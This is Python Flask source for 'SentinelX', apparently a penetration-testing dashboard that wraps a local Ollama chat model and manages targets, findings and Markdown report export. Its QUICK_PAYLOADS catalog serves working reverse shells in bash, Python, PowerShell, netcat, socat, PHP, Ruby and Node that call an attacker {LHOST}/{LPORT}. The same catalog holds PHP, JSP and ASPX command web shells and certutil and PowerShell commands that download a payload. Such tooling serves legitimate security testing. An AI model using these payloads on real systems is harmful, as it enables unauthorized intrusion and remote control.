"""SentinelX Web Dashboard Server & Offensive Intelligence Engine."""
import json
import uuid
import os
import threading
from datetime import datetime, timezone
from pathlib import Path
from flask import Flask, request, jsonify, render_template, Response, stream_with_context
import requests

from sentinelx import database as db
from sentinelx.prompts import SENTINELX_SYSTEM_PROMPT

BASE_DIR = Path(__file__).parent
TEMPLATE_DIR = BASE_DIR / "templates"
STATIC_DIR = BASE_DIR / "static"

app = Flask(__name__, template_folder=str(TEMPLATE_DIR), static_folder=str(STATIC_DIR))

# Security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

OLLAMA_BASE_URL = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
OLLAMA_CHAT_URL = f"{OLLAMA_BASE_URL}/api/chat"
OLLAMA_TAGS_URL = f"{OLLAMA_BASE_URL}/api/tags"
OLLAMA_PULL_URL = f"{OLLAMA_BASE_URL}/api/pull"

active_requests = {}
request_lock = threading.Lock()


# ============ Pages ============

@app.route('/')
def index():
    return render_template('dashboard.html')


# ============ Health & Model APIs ============

@app.route('/api/health')
def api_health():
    """Check Ollama connectivity and installed model count."""
    try:
        r = requests.get(OLLAMA_TAGS_URL, timeout=3)
        r.raise_for_status()
        data = r.json()
        models = data.get('models', [])
        return jsonify({
            "success": True,
            "ollama": True,
            "models_count": len(models),
            "models": [m.get('name') for m in models]
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "ollama": False,
            "models_count": 0,
            "models": [],
            "error": str(e)
        })


@app.route('/api/models')
def api_get_models():
    """Discover all models installed in Ollama with metadata."""
    try:
        r = requests.get(OLLAMA_TAGS_URL, timeout=4)
        r.raise_for_status()
        data = r.json()
        models_raw = data.get('models', [])
        
        parsed_models = []
        for m in models_raw:
            details = m.get('details', {})
            parsed_models.append({
                "name": m.get('name', 'unknown'),
                "size_bytes": m.get('size', 0),
                "parameter_size": details.get('parameter_size', 'unknown'),
                "family": details.get('family', 'generic'),
                "quantization": details.get('quantization_level', 'unknown'),
                "modified_at": m.get('modified_at', '')
            })
            
        return jsonify({
            "success": True,
            "ollama": True,
            "models": parsed_models
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "ollama": False,
            "models": [],
            "error": f"Could not connect to Ollama at {OLLAMA_BASE_URL}: {str(e)}"
        })


@app.route('/api/models/pull', methods=['POST'])
def api_pull_model():
    """Stream live model pulling from Ollama registry."""
    data = request.json or {}
    model_name = data.get('model', '').strip()
    if not model_name:
        return jsonify({"error": "Model name required"}), 400

    def generate_pull_stream():
        try:
            payload = {"name": model_name, "stream": True}
            with requests.post(OLLAMA_PULL_URL, json=payload, stream=True, timeout=1800) as r:
                r.raise_for_status()
                for line in r.iter_lines():
                    if line:
                        chunk_str = line.decode('utf-8')
                        yield f"data: {chunk_str}\n\n"
        except Exception as e:
            err_obj = json.dumps({"error": str(e)})
            yield f"data: {err_obj}\n\n"

    return Response(stream_with_context(generate_pull_stream()), mimetype='text/event-stream')


# ============ Sessions API ============

@app.route('/api/sessions')
def api_get_sessions():
    sessions = db.get_sessions()
    return jsonify({"success": True, "sessions": sessions})


@app.route('/api/sessions', methods=['POST'])
def api_create_session():
    data = request.json or {}
    name = data.get('name')
    model = data.get('model', '')
    session_id = db.create_session(name=name, model=model)
    return jsonify({"success": True, "session_id": session_id})


@app.route('/api/sessions/<session_id>', methods=['PATCH'])
def api_rename_session(session_id):
    data = request.json or {}
    name = data.get('name', '').strip()
    if not name:
        return jsonify({"error": "Name required"}), 400
    db.rename_session(session_id, name)
    return jsonify({"success": True})


@app.route('/api/sessions/<session_id>', methods=['DELETE'])
def api_delete_session(session_id):
    db.delete_session(session_id)
    return jsonify({"success": True})


@app.route('/api/sessions/<session_id>/messages')
def api_get_messages(session_id):
    messages = db.get_messages(session_id)
    return jsonify({"success": True, "messages": messages})


@app.route('/api/sessions/<session_id>/messages', methods=['DELETE'])
def api_clear_messages(session_id):
    db.clear_messages(session_id)
    return jsonify({"success": True})


@app.route('/api/history/clear', methods=['POST', 'DELETE'])
def api_clear_history():
    """Clear all chat sessions and database history."""
    try:
        db.clear_all_history()
        return jsonify({"success": True, "message": "All chat history and database records cleared."})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============ Chat Streaming Engine ============

@app.route('/api/chat/stream', methods=['POST'])
def api_chat_stream():
    """Stream chat response with dynamic persona and engagement context injection."""
    data = request.json or {}
    message = data.get('message', '').strip()
    session_id = data.get('session_id')
    model = data.get('model', '').strip()
    temperature = float(data.get('temperature', 0.25))

    if not message or not session_id:
        return jsonify({"error": "Missing message or session_id"}), 400

    # Auto-resolve fallback model if user did not specify
    if not model:
        try:
            r = requests.get(OLLAMA_TAGS_URL, timeout=2)
            if r.ok:
                models = r.json().get('models', [])
                if models:
                    model = models[0].get('name')
        except Exception:
            pass
        if not model:
            model = "sentinelx"

    # Save session model preference
    db.update_session_model(session_id, model)

    # Save user message to database
    db.add_message(session_id, 'user', message)

    # Build history with sliding window to protect against context limits
    history = db.get_messages(session_id)
    recent_history = history[-14:] if len(history) > 14 else history

    # Construct messages array for Ollama
    system_content = SENTINELX_SYSTEM_PROMPT
    ollama_messages = [{"role": "system", "content": system_content}]
    for m in recent_history:
        ollama_messages.append({"role": m['role'], "content": m['content']})

    request_id = str(uuid.uuid4())[:8]

    def generate_chat_stream():
        full_response = ""
        with request_lock:
            active_requests[request_id] = {"cancelled": False}

        try:
            payload = {
                "model": model,
                "messages": ollama_messages,
                "stream": True,
                "options": {
                    "temperature": temperature,
                    "top_p": 0.9,
                    "repeat_penalty": 1.15
                }
            }

            with requests.post(OLLAMA_CHAT_URL, json=payload, stream=True, timeout=180) as r:
                if not r.ok:
                    err_msg = f"Ollama error ({r.status_code}): {r.text}"
                    full_response = err_msg
                    yield err_msg
                    return

                for line in r.iter_lines():
                    # Check cancellation
                    with request_lock:
                        if active_requests.get(request_id, {}).get("cancelled"):
                            break

                    if line:
                        chunk = json.loads(line.decode('utf-8'))
                        if 'message' in chunk and 'content' in chunk['message']:
                            content = chunk['message']['content']
                            full_response += content
                            yield content
                        if chunk.get('done'):
                            break

        except requests.exceptions.ConnectionError:
            err_msg = "\n\n⚠️ **Ollama connection failed.** Please ensure Ollama is running (`ollama serve`)."
            full_response += err_msg
            yield err_msg
        except Exception as e:
            err_msg = f"\n\n[Error during generation: {str(e)}]"
            full_response += err_msg
            yield err_msg
        finally:
            with request_lock:
                active_requests.pop(request_id, None)

            # Persist assistant response (even if stopped midway)
            if full_response.strip():
                db.add_message(session_id, 'assistant', full_response)

    response = Response(stream_with_context(generate_chat_stream()), mimetype='text/plain; charset=utf-8')
    response.headers['X-Request-ID'] = request_id
    response.headers['X-Model-Used'] = model
    return response


@app.route('/api/chat/abort', methods=['POST'])
def api_chat_abort():
    """Cancel active streaming request."""
    data = request.json or {}
    request_id = data.get('request_id')
    if not request_id:
        return jsonify({"error": "Missing request_id"}), 400

    with request_lock:
        if request_id in active_requests:
            active_requests[request_id]["cancelled"] = True
            return jsonify({"success": True, "message": "Cancelled"})

    return jsonify({"success": False, "message": "Request not active or already finished"})


# ============ Targets API ============

@app.route('/api/targets')
def api_get_targets():
    return jsonify({"success": True, "targets": db.get_targets()})


@app.route('/api/targets', methods=['POST'])
def api_add_target():
    data = request.json or {}
    value = data.get('value', '').strip()
    notes = data.get('notes', '').strip()
    if not value:
        return jsonify({"error": "Target value required"}), 400

    success = db.add_target(value, notes)
    return jsonify({"success": success})


@app.route('/api/targets/<int:target_id>', methods=['DELETE'])
def api_delete_target(target_id):
    db.delete_target(target_id)
    return jsonify({"success": True})


# ============ Findings API ============

@app.route('/api/findings')
def api_get_findings():
    session_id = request.args.get('session_id')
    findings = db.get_findings(session_id)
    return jsonify({"success": True, "findings": findings})


@app.route('/api/findings', methods=['POST'])
def api_add_finding():
    data = request.json or {}
    session_id = data.get('session_id')
    title = data.get('title', '').strip()
    severity = data.get('severity', 'info')
    description = data.get('description', '').strip()
    target = data.get('target', '').strip()
    status = data.get('status', 'open')
    cvss = float(data.get('cvss', 0.0))

    if not title:
        return jsonify({"error": "Title required"}), 400

    finding_id = db.add_finding(session_id, title, severity, description, target, status, cvss)
    return jsonify({"success": True, "finding_id": finding_id})


@app.route('/api/findings/<int:finding_id>', methods=['DELETE'])
def api_delete_finding(finding_id):
    db.delete_finding(finding_id)
    return jsonify({"success": True})


# ============ Comprehensive Quick Payloads Catalog ============

QUICK_PAYLOADS = {
    # Reverse Shells
    "rev_bash_tcp": {
        "name": "Bash TCP (/dev/tcp)",
        "code": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "language": "bash",
        "category": "Reverse Shells"
    },
    "rev_bash_196": {
        "name": "Bash File Descriptor 196",
        "code": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
        "language": "bash",
        "category": "Reverse Shells"
    },
    "rev_python3": {
        "name": "Python 3 Socket",
        "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "language": "python",
        "category": "Reverse Shells"
    },
    "rev_powershell": {
        "name": "PowerShell TCP Client",
        "code": "$c=New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()",
        "language": "powershell",
        "category": "Reverse Shells"
    },
    "rev_nc_fifo": {
        "name": "Netcat Mkfifo",
        "code": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        "language": "bash",
        "category": "Reverse Shells"
    },
    "rev_nc_e": {
        "name": "Netcat -e",
        "code": "nc -e /bin/sh {LHOST} {LPORT}",
        "language": "bash",
        "category": "Reverse Shells"
    },
    "rev_socat_pty": {
        "name": "Socat Interactive PTY",
        "code": "socat TCP:{LHOST}:{LPORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
        "language": "bash",
        "category": "Reverse Shells"
    },
    "rev_php": {
        "name": "PHP fsockopen",
        "code": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "language": "php",
        "category": "Reverse Shells"
    },
    "rev_ruby": {
        "name": "Ruby TCPSocket",
        "code": "ruby -rsocket -e'c=TCPSocket.new(\"{LHOST}\",{LPORT});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "language": "ruby",
        "category": "Reverse Shells"
    },
    "rev_node": {
        "name": "Node.js Spawn",
        "code": "require('child_process').spawn('/bin/sh',[]).stdout.pipe(require('net').connect({LPORT},'{LHOST}'));",
        "language": "javascript",
        "category": "Reverse Shells"
    },

    # Web Shells
    "web_php_mini": {
        "name": "PHP Mini Shell",
        "code": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; } ?>",
        "language": "php",
        "category": "Web Shells"
    },
    "web_php_system": {
        "name": "PHP System Passthru",
        "code": "<?php system($_GET['cmd']); ?>",
        "language": "php",
        "category": "Web Shells"
    },
    "web_jsp": {
        "name": "JSP Runtime Exec",
        "code": "<%@ page import=\"java.io.*\" %><% String c=request.getParameter(\"cmd\"); if(c!=null){Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l);}} %>",
        "language": "jsp",
        "category": "Web Shells"
    },
    "web_aspx": {
        "name": "ASPX Command Runner",
        "code": "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><%= Process.Start(new ProcessStartInfo(\"cmd\",\"/c \" + Request[\"cmd\"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>",
        "language": "aspx",
        "category": "Web Shells"
    },

    # TTY Elevation & Transfers
    "tty_python": {
        "name": "Python PTY Spawn",
        "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "language": "bash",
        "category": "TTY Elevation"
    },
    "tty_stty_raw": {
        "name": "Full TTY Upgrade Steps",
        "code": "# 1. In reverse shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# 2. Press Ctrl+Z to background\n# 3. In your host: stty raw -echo; fg\n# 4. In shell: export TERM=xterm-256color; reset",
        "language": "bash",
        "category": "TTY Elevation"
    },
    "dl_python_http": {
        "name": "Python HTTP Server (Host)",
        "code": "python3 -m http.server {LPORT}",
        "language": "bash",
        "category": "File Transfers"
    },
    "dl_certutil": {
        "name": "Windows Certutil Download",
        "code": "certutil.exe -urlcache -split -f http://{LHOST}:{LPORT}/shell.exe shell.exe",
        "language": "cmd",
        "category": "File Transfers"
    },
    "dl_powershell": {
        "name": "PowerShell DownloadFile",
        "code": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{LHOST}:{LPORT}/payload.exe', 'payload.exe')\"",
        "language": "powershell",
        "category": "File Transfers"
    }
}


@app.route('/api/quick-payloads')
def api_quick_payloads():
    return jsonify({"success": True, "payloads": QUICK_PAYLOADS})


# ============ Pentest Report Exporting ============

@app.route('/api/reports/markdown')
def api_export_markdown_report():
    """Generate and download a penetration testing findings report in Markdown."""
    session_id = request.args.get('session_id')
    targets = db.get_targets()
    findings = db.get_findings(session_id)
    session = db.get_session(session_id) if session_id else None
    session_name = session.get('name', 'General Assessment') if session else 'General Assessment'

    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    lines = [
        f"# Penetration Testing Engagement Report",
        f"**Assessment:** {session_name}  ",
        f"**Date Generated:** {now_str}  ",
        f"**Generated By:** SentinelX Offensive Intelligence Platform  \n",
        "---",
        "\n## 1. Executive Summary",
        f"This report outlines security assessment findings identified during the engagement. "
        f"A total of **{len(findings)} findings** were logged across **{len(targets)} targets**.",
        "\n## 2. Assessment Scope & Target Inventory",
        "| ID | Target / Host / Domain | Engagement Notes | Date Added |",
        "| :--- | :--- | :--- | :--- |"
    ]

    if targets:
        for t in targets:
            lines.append(f"| {t['id']} | `{t['value']}` | {t.get('notes') or 'N/A'} | {t['created_at'][:10]} |")
    else:
        lines.append("| - | *No targets defined* | - | - |")

    lines.extend([
        "\n## 3. Vulnerability Findings Matrix",
        "| Severity | Finding Title | Associated Target | Status | CVSS |",
        "| :--- | :--- | :--- | :--- | :--- |"
    ])

    if findings:
        for f in findings:
            sev = f['severity'].upper()
            lines.append(f"| **{sev}** | {f['title']} | `{f.get('target') or 'All'}` | {f.get('status','open').upper()} | {f.get('cvss',0.0)} |")

        lines.append("\n## 4. Finding Details & Proof of Concept")
        for i, f in enumerate(findings, 1):
            lines.extend([
                f"\n### 4.{i} [{f['severity'].upper()}] {f['title']}",
                f"- **Target:** `{f.get('target') or 'N/A'}`",
                f"- **Status:** `{f.get('status','open').upper()}`",
                f"- **CVSS Base Score:** {f.get('cvss', 0.0)}",
                f"- **Description & Evidence:**\n\n```text\n{f.get('description') or 'No description provided.'}\n```\n"
            ])
    else:
        lines.append("| - | *No findings logged* | - | - | - |")

    content = "\n".join(lines)
    filename = f"SentinelX-Report-{session_id or 'all'}.md"
    return Response(
        content,
        mimetype='text/markdown',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'}
    )


# ============ Entrypoint ============

def main():
    debug_mode = os.environ.get('SENTINELX_DEBUG', '').lower() == 'true'
    print("=" * 64)
    print("  🛡️  SENTINELX - Offensive Security Intelligence Platform")
    print("=" * 64)
    print("  Dashboard: http://127.0.0.1:5000")
    print("  Ollama:    " + OLLAMA_BASE_URL)
    print("=" * 64)
    app.run(host='127.0.0.1', port=5000, debug=debug_mode, threaded=True)


if __name__ == '__main__':
    main()
